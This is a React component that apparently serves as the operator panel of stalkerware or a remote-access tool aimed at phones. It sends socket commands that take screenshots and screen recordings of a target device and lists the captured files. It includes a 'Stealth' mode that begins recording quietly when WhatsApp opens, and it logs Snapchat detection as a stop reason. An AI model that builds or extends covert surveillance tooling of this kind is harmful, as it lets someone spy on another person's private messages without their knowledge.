"use client";

import React, { useState, useEffect, useRef } from 'react';
import {
    Camera, Download, Video, VideoOff, Square,
    Clock, Play, AlertCircle, CheckCircle2,
    Trash2, X, Image as ImageIcon, Eye
} from 'lucide-react';

interface ScreenRecordViewProps {
    socket: any;
    userUuid: string;
    selectedDeviceId: string | null;
    isOnline: boolean;
    deviceName?: string;
}

interface SavedCapture {
    id: string;
    url: string;
    timestamp: number;
    width?: number;
    height?: number;
}

interface SavedRecording {
    id: string;
    url: string;
    timestamp: number;
    elapsedMs: number;
    totalMs: number;
    reason: string;
}

const DURATION_OPTIONS = [
    { label: '1 min',  value: 60 },
    { label: '2 min',  value: 120 },
    { label: '5 min',  value: 300 },
];

function fmtMs(ms: number) {
    const s  = Math.floor(ms / 1000);
    const m  = Math.floor(s / 60);
    const ss = (s % 60).toString().padStart(2, '0');
    return `${m}:${ss}`;
}

function fmtReason(r: string) {
    if (r === 'duration_complete')     return 'Completed';
    if (r === 'manual_stop')           return 'Stopped';
    if (r === 'secure_app_detected')   return 'Snapchat opened';
    if (r === 'encoder_error')         return 'Encoder error';
    if (r === 'token_released')        return 'Token released';
    return r;
}

export default function ScreenRecordView({
    socket,
    userUuid,
    selectedDeviceId,
    isOnline,
    deviceName
}: ScreenRecordViewProps) {
    // ── Token & device state ───────────────────────────────────────────────────
    const [hasToken,     setHasToken]     = useState<boolean | null>(null);
    const [statusMsg,    setStatusMsg]    = useState<{ type: 'info' | 'warning' | 'success' | 'error'; text: string } | null>(null);

    // ── Snapshot state ─────────────────────────────────────────────────────────
    const [isCapturing,  setIsCapturing]  = useState(false);
    const [lastFrame,    setLastFrame]    = useState<string | null>(null);
    const [savedCaptures,setSavedCaptures]= useState<SavedCapture[]>([]);
    const [previewCapture,setPreviewCapture] = useState<SavedCapture | null>(null);

    // ── Recording state ────────────────────────────────────────────────────────
    const [isRecording,  setIsRecording]  = useState(false);
    const [recMode,      setRecMode]      = useState<'stealth' | 'simple'>('stealth');
    const [recDuration,  setRecDuration]  = useState(60);
    const [recElapsedMs, setRecElapsedMs] = useState(0);
    const [recTotalMs,   setRecTotalMs]   = useState(0);
    const [savedRecs,    setSavedRecs]    = useState<SavedRecording[]>([]);
    const [pendingRec,   setPendingRec]   = useState(false); // stealth waiting for WhatsApp

    // Refs
    const isRecordingRef = useRef(false);
    isRecordingRef.current = isRecording;

    // ── Socket event listeners ─────────────────────────────────────────────────
    useEffect(() => {
        if (!socket) return;

        if (selectedDeviceId && isOnline) {
            socket.emit('screen_status_query', { uuid: userUuid, targetDeviceId: selectedDeviceId });
        }

        const onScreenFrame = (data: any) => {
            if (!data?.frame) return;
            const b64 = data.frame.startsWith('data:image')
                ? data.frame
                : `data:image/jpeg;base64,${data.frame}`;
            setLastFrame(b64);
            setIsCapturing(false);
            const capture: SavedCapture = {
                id:        `cap_${Date.now()}`,
                url:       b64,
                timestamp: data.timestamp || Date.now(),
                width:     data.width,
                height:    data.height
            };
            setSavedCaptures(prev => [capture, ...prev.slice(0, 39)]);
            setStatusMsg({ type: 'success', text: 'Screenshot captured.' });
        };

        const onScreenSaved = (data: any) => {
            if (data?.url) {
                setSavedCaptures(prev => prev.map(c =>
                    c.timestamp === data.timestamp ? { ...c, url: data.url } : c
                ));
            }
        };

        const onScreenStatus = (data: any) => {
            if (!data) return;
            if (data.hasToken !== undefined) setHasToken(!!data.hasToken);

            switch (data.status) {
                case 'token_needed':
                    setHasToken(false);
                    setPendingRec(true);
                    setStatusMsg({ type: 'warning', text: 'Waiting for permission on phone...' });
                    break;
                case 'authorized':
                    setHasToken(true);
                    setStatusMsg({ type: 'success', text: 'Screen capture ready.' });
                    break;
                case 'recording_started':
                    setIsRecording(true);
                    setPendingRec(false);
                    setRecElapsedMs(0);
                    setRecTotalMs((data.durationSec || 60) * 1000);
                    setStatusMsg(null);
                    break;
                case 'stream_stopped':
                case 'no_token':
                    setHasToken(false);
                    if (data.reason === 'device_stopped') {
                        setStatusMsg({ type: 'warning', text: 'Screen capture stopped on device.' });
                    }
                    break;
                case 'denied':
                    setIsRecording(false);
                    setPendingRec(false);
                    setIsCapturing(false);
                    setHasToken(false);
                    setStatusMsg({ type: 'error', text: data.error || 'Permission denied on device.' });
                    break;
                default:
                    if (data.error) {
                        setStatusMsg({ type: 'error', text: data.error });
                    }
            }
        };

        const onRecProgress = (data: any) => {
            if (!data) return;
            setIsRecording(true);
            setPendingRec(false);
            setRecElapsedMs(data.elapsedMs  || 0);
            setRecTotalMs(data.totalMs    || 0);
        };

        const onRecComplete = (data: any) => {
            if (!data) return;
            setIsRecording(false);
            setPendingRec(false);
            setRecElapsedMs(0);

            if (data.url) {
                const rec: SavedRecording = {
                    id:        `rec_${Date.now()}`,
                    url:       data.url,
                    timestamp: data.timestamp || Date.now(),
                    elapsedMs: data.elapsedMs  || 0,
                    totalMs:   data.totalMs    || 0,
                    reason:    data.reason     || 'unknown'
                };
                setSavedRecs(prev => [rec, ...prev.slice(0, 19)]);
                const label = fmtReason(data.reason);
                setStatusMsg({ type: 'success', text: `Recording saved (${fmtMs(data.elapsedMs || 0)}) — ${label}` });
            } else {
                setStatusMsg({ type: 'warning', text: `Recording ended: ${fmtReason(data.reason || 'unknown')}` });
            }
        };

        socket.on('screen_frame',        onScreenFrame);
        socket.on('screen_saved',        onScreenSaved);
        socket.on('screen_status',       onScreenStatus);
        socket.on('screen_rec_progress', onRecProgress);
        socket.on('screen_rec_complete', onRecComplete);

        return () => {
            if (isRecordingRef.current) {
                socket.emit('screen_record_stop', { uuid: userUuid, targetDeviceId: selectedDeviceId });
            }
            socket.off('screen_frame',        onScreenFrame);
            socket.off('screen_saved',        onScreenSaved);
            socket.off('screen_status',       onScreenStatus);
            socket.off('screen_rec_progress', onRecProgress);
            socket.off('screen_rec_complete', onRecComplete);
        };
    }, [socket, selectedDeviceId, isOnline, userUuid]);

    // ── Status message auto-clear ──────────────────────────────────────────────
    useEffect(() => {
        if (!statusMsg || statusMsg.type === 'warning' || statusMsg.type === 'error') return;
        const t = setTimeout(() => setStatusMsg(null), 5000);
        return () => clearTimeout(t);
    }, [statusMsg]);

    // ── Actions ────────────────────────────────────────────────────────────────

    const handleSnapshot = () => {
        if (!selectedDeviceId || !isOnline || !socket || isRecording) return;
        setIsCapturing(true);
        socket.emit('screen_capture', { uuid: userUuid, targetDeviceId: selectedDeviceId, quality: 85 });
        setTimeout(() => setIsCapturing(false), 15000);
    };

    const handleStartRecord = () => {
        if (!selectedDeviceId || !isOnline || !socket || isRecording) return;
        setPendingRec(true);
        setRecElapsedMs(0);
        setRecTotalMs(recDuration * 1000);
        socket.emit('screen_record_start', {
            uuid:           userUuid,
            targetDeviceId: selectedDeviceId,
            duration:       recDuration,
            mode:           recMode
        });
        if (recMode === 'stealth') {
            setStatusMsg({ type: 'info', text: 'Stealth recording queued — will start when WhatsApp opens.' });
        } else {
            setStatusMsg({ type: 'info', text: 'Permission prompt sent to phone...' });
        }
    };

    const handleStopRecord = () => {
        if (!selectedDeviceId || !socket) return;
        socket.emit('screen_record_stop', { uuid: userUuid, targetDeviceId: selectedDeviceId });
        setIsRecording(false);
        setPendingRec(false);
    };

    const progressPct = recTotalMs > 0
        ? Math.min((recElapsedMs / recTotalMs) * 100, 100)
        : 0;

    // ── Render ─────────────────────────────────────────────────────────────────
    return (
        <div className="flex flex-col gap-4 p-4 text-white max-w-2xl mx-auto">

            {/* ── Header ──────────────────────────────────────────────────────── */}
            <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                    <Video className="w-5 h-5 text-violet-400" />
                    <h2 className="text-lg font-semibold">Screen Capture</h2>
                </div>
                <div className="flex items-center gap-2 text-xs">
                    <span className={`w-2 h-2 rounded-full ${isOnline ? 'bg-green-400' : 'bg-red-500'}`} />
                    <span className="text-white/50">{deviceName || 'No device'}</span>
                    {hasToken !== null && (
                        <span className={`px-2 py-0.5 rounded-full text-xs font-medium ${hasToken ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}`}>
                            {hasToken ? 'Token ✓' : 'No Token'}
                        </span>
                    )}
                </div>
            </div>

            {/* ── Status Message ───────────────────────────────────────────────── */}
            {statusMsg && (
                <div className={`flex items-center gap-2 rounded-xl px-4 py-3 text-sm ${
                    statusMsg.type === 'success' ? 'bg-green-500/15 text-green-400 border border-green-500/20' :
                    statusMsg.type === 'error'   ? 'bg-red-500/15   text-red-400   border border-red-500/20'   :
                    statusMsg.type === 'warning' ? 'bg-yellow-500/15 text-yellow-400 border border-yellow-500/20' :
                                                    'bg-blue-500/15  text-blue-400  border border-blue-500/20'
                }`}>
                    {statusMsg.type === 'success' ? <CheckCircle2 className="w-4 h-4 shrink-0" /> : <AlertCircle className="w-4 h-4 shrink-0" />}
                    <span>{statusMsg.text}</span>
                    <button onClick={() => setStatusMsg(null)} className="ml-auto opacity-60 hover:opacity-100"><X className="w-3 h-3" /></button>
                </div>
            )}

            {/* ── Snapshot Section ─────────────────────────────────────────────── */}
            <div className="rounded-2xl bg-white/5 border border-white/10 overflow-hidden">
                {/* Preview */}
                {lastFrame ? (
                    <div className="relative bg-black">
                        <img src={lastFrame} alt="Last snapshot" className="w-full object-contain max-h-64" />
                        <div className="absolute bottom-2 right-2 flex gap-2">
                            <a
                                href={lastFrame}
                                download={`screenshot_${Date.now()}.jpg`}
                                className="p-1.5 rounded-lg bg-black/60 hover:bg-black/80 transition-colors"
                            >
                                <Download className="w-4 h-4" />
                            </a>
                        </div>
                    </div>
                ) : (
                    <div className="flex flex-col items-center justify-center py-10 text-white/30 gap-2">
                        <Camera className="w-10 h-10" />
                        <span className="text-sm">No screenshot yet</span>
                    </div>
                )}
                {/* Snapshot button */}
                <div className="p-3 border-t border-white/10">
                    <button
                        onClick={handleSnapshot}
                        disabled={!isOnline || !selectedDeviceId || isCapturing || isRecording}
                        className="w-full flex items-center justify-center gap-2 py-2.5 rounded-xl bg-white/10 hover:bg-white/15 disabled:opacity-40 disabled:cursor-not-allowed transition-all text-sm font-medium"
                    >
                        <Camera className={`w-4 h-4 ${isCapturing ? 'animate-pulse text-yellow-400' : ''}`} />
                        {isCapturing ? 'Capturing...' : '📷 Snapshot'}
                    </button>
                </div>
            </div>

            {/* ── Recording Controls ───────────────────────────────────────────── */}
            <div className="rounded-2xl bg-white/5 border border-white/10 p-4 flex flex-col gap-4">
                <div className="flex items-center gap-2 text-sm font-medium text-white/80">
                    <Video className="w-4 h-4 text-violet-400" />
                    Screen Recording
                </div>

                {/* Duration pills */}
                <div className="flex flex-col gap-2">
                    <span className="text-xs text-white/40 uppercase tracking-wider">Duration</span>
                    <div className="flex gap-2">
                        {DURATION_OPTIONS.map(opt => (
                            <button
                                key={opt.value}
                                onClick={() => setRecDuration(opt.value)}
                                disabled={isRecording || pendingRec}
                                className={`flex-1 py-2 rounded-xl text-sm font-medium transition-all disabled:opacity-40 disabled:cursor-not-allowed ${
                                    recDuration === opt.value
                                        ? 'bg-violet-500 text-white'
                                        : 'bg-white/10 hover:bg-white/15 text-white/70'
                                }`}
                            >
                                {opt.label}
                            </button>
                        ))}
                    </div>
                </div>

                {/* Mode toggle */}
                <div className="flex flex-col gap-2">
                    <span className="text-xs text-white/40 uppercase tracking-wider">Mode</span>
                    <div className="grid grid-cols-2 gap-2">
                        <button
                            onClick={() => setRecMode('stealth')}
                            disabled={isRecording || pendingRec}
                            className={`py-2.5 px-3 rounded-xl text-sm transition-all disabled:opacity-40 disabled:cursor-not-allowed ${
                                recMode === 'stealth'
                                    ? 'bg-violet-500/30 border border-violet-500 text-violet-300'
                                    : 'bg-white/5 border border-white/10 text-white/50 hover:border-white/20'
                            }`}
                        >
                            <div className="font-semibold">🔇 Stealth</div>
                            <div className="text-xs opacity-70 mt-0.5">Starts when WhatsApp opens</div>
                        </button>
                        <button
                            onClick={() => setRecMode('simple')}
                            disabled={isRecording || pendingRec}
                            className={`py-2.5 px-3 rounded-xl text-sm transition-all disabled:opacity-40 disabled:cursor-not-allowed ${
                                recMode === 'simple'
                                    ? 'bg-blue-500/30 border border-blue-500 text-blue-300'
                                    : 'bg-white/5 border border-white/10 text-white/50 hover:border-white/20'
                            }`}
                        >
                            <div className="font-semibold">📱 Simple</div>
                            <div className="text-xs opacity-70 mt-0.5">Prompt fires immediately</div>
                        </button>
                    </div>
                </div>

                {/* Start / Stop button */}
                {!isRecording && !pendingRec ? (
                    <button
                        onClick={handleStartRecord}
                        disabled={!isOnline || !selectedDeviceId || isCapturing}
                        className="w-full py-3 rounded-xl bg-gradient-to-r from-violet-600 to-violet-500 hover:from-violet-500 hover:to-violet-400 disabled:opacity-40 disabled:cursor-not-allowed transition-all flex items-center justify-center gap-2 font-semibold text-sm shadow-lg shadow-violet-900/30"
                    >
                        <Play className="w-4 h-4" />
                        Start Recording
                    </button>
                ) : pendingRec && !isRecording ? (
                    <div className="flex gap-2">
                        <div className="flex-1 py-3 rounded-xl bg-yellow-500/20 border border-yellow-500/30 text-yellow-400 text-sm font-medium flex items-center justify-center gap-2">
                            <Clock className="w-4 h-4 animate-spin" />
                            {recMode === 'stealth' ? 'Waiting for WhatsApp...' : 'Waiting for permission...'}
                        </div>
                        <button
                            onClick={handleStopRecord}
                            className="px-4 py-3 rounded-xl bg-red-500/20 border border-red-500/30 text-red-400 hover:bg-red-500/30 transition-all"
                        >
                            <Square className="w-4 h-4" />
                        </button>
                    </div>
                ) : (
                    /* Recording in progress */
                    <div className="flex flex-col gap-3">
                        <div className="flex items-center justify-between text-sm">
                            <div className="flex items-center gap-2 text-red-400">
                                <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
                                <span className="font-semibold">Recording</span>
                            </div>
                            <span className="font-mono text-white/70">{fmtMs(recElapsedMs)} / {fmtMs(recTotalMs)}</span>
                        </div>
                        {/* Progress bar */}
                        <div className="h-2 rounded-full bg-white/10 overflow-hidden">
                            <div
                                className="h-full rounded-full bg-gradient-to-r from-red-500 to-orange-400 transition-all duration-1000"
                                style={{ width: `${progressPct}%` }}
                            />
                        </div>
                        <button
                            onClick={handleStopRecord}
                            className="w-full py-2.5 rounded-xl bg-red-500/20 border border-red-500/30 text-red-400 hover:bg-red-500/30 transition-all flex items-center justify-center gap-2 text-sm font-medium"
                        >
                            <Square className="w-4 h-4" />
                            Stop Recording
                        </button>
                    </div>
                )}
            </div>

            {/* ── Saved Recordings ─────────────────────────────────────────────── */}
            {savedRecs.length > 0 && (
                <div className="rounded-2xl bg-white/5 border border-white/10 overflow-hidden">
                    <div className="px-4 py-3 border-b border-white/10 flex items-center gap-2 text-sm text-white/60">
                        <Video className="w-4 h-4" />
                        Recordings ({savedRecs.length})
                    </div>
                    <div className="divide-y divide-white/5">
                        {savedRecs.map(rec => (
                            <div key={rec.id} className="flex items-center gap-3 px-4 py-3 hover:bg-white/5 transition-colors">
                                <div className="w-8 h-8 rounded-lg bg-violet-500/20 flex items-center justify-center shrink-0">
                                    <Video className="w-4 h-4 text-violet-400" />
                                </div>
                                <div className="flex-1 min-w-0">
                                    <div className="text-sm font-medium truncate">
                                        {fmtMs(rec.elapsedMs)} recording
                                    </div>
                                    <div className="text-xs text-white/40">
                                        {new Date(rec.timestamp).toLocaleTimeString()} — {fmtReason(rec.reason)}
                                    </div>
                                </div>
                                <div className="flex gap-2 shrink-0">
                                    <a
                                        href={rec.url}
                                        target="_blank"
                                        rel="noopener noreferrer"
                                        className="p-1.5 rounded-lg bg-white/5 hover:bg-white/10 transition-colors"
                                        title="Play"
                                    >
                                        <Play className="w-3.5 h-3.5" />
                                    </a>
                                    <a
                                        href={rec.url}
                                        download
                                        className="p-1.5 rounded-lg bg-white/5 hover:bg-white/10 transition-colors"
                                        title="Download"
                                    >
                                        <Download className="w-3.5 h-3.5" />
                                    </a>
                                    <button
                                        onClick={() => setSavedRecs(prev => prev.filter(r => r.id !== rec.id))}
                                        className="p-1.5 rounded-lg bg-white/5 hover:bg-red-500/20 text-white/40 hover:text-red-400 transition-colors"
                                        title="Remove"
                                    >
                                        <Trash2 className="w-3.5 h-3.5" />
                                    </button>
                                </div>
                            </div>
                        ))}
                    </div>
                </div>
            )}

            {/* ── Screenshots Gallery ──────────────────────────────────────────── */}
            {savedCaptures.length > 0 && (
                <div className="rounded-2xl bg-white/5 border border-white/10 overflow-hidden">
                    <div className="px-4 py-3 border-b border-white/10 flex items-center justify-between">
                        <div className="flex items-center gap-2 text-sm text-white/60">
                            <ImageIcon className="w-4 h-4" />
                            Screenshots ({savedCaptures.length})
                        </div>
                        <button
                            onClick={() => setSavedCaptures([])}
                            className="text-xs text-white/30 hover:text-red-400 transition-colors"
                        >
                            Clear all
                        </button>
                    </div>
                    <div className="grid grid-cols-5 gap-1 p-2">
                        {savedCaptures.map(cap => (
                            <div
                                key={cap.id}
                                className="relative aspect-[9/16] rounded-lg overflow-hidden bg-black/40 cursor-pointer group"
                                onClick={() => setPreviewCapture(cap)}
                            >
                                <img src={cap.url} alt="screenshot" className="w-full h-full object-cover" />
                                <div className="absolute inset-0 bg-black/0 group-hover:bg-black/40 transition-colors flex items-center justify-center">
                                    <Eye className="w-4 h-4 opacity-0 group-hover:opacity-100 transition-opacity" />
                                </div>
                            </div>
                        ))}
                    </div>
                </div>
            )}

            {/* ── Screenshot Lightbox ──────────────────────────────────────────── */}
            {previewCapture && (
                <div
                    className="fixed inset-0 z-50 bg-black/90 flex items-center justify-center p-4"
                    onClick={() => setPreviewCapture(null)}
                >
                    <div className="relative max-w-sm w-full" onClick={e => e.stopPropagation()}>
                        <img src={previewCapture.url} alt="preview" className="w-full rounded-xl shadow-2xl" />
                        <div className="absolute top-2 right-2 flex gap-2">
                            <a
                                href={previewCapture.url}
                                download={`screenshot_${previewCapture.timestamp}.jpg`}
                                className="p-2 rounded-lg bg-black/60 hover:bg-black/80 transition-colors"
                            >
                                <Download className="w-4 h-4" />
                            </a>
                            <button
                                onClick={() => setPreviewCapture(null)}
                                className="p-2 rounded-lg bg-black/60 hover:bg-black/80 transition-colors"
                            >
                                <X className="w-4 h-4" />
                            </button>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}
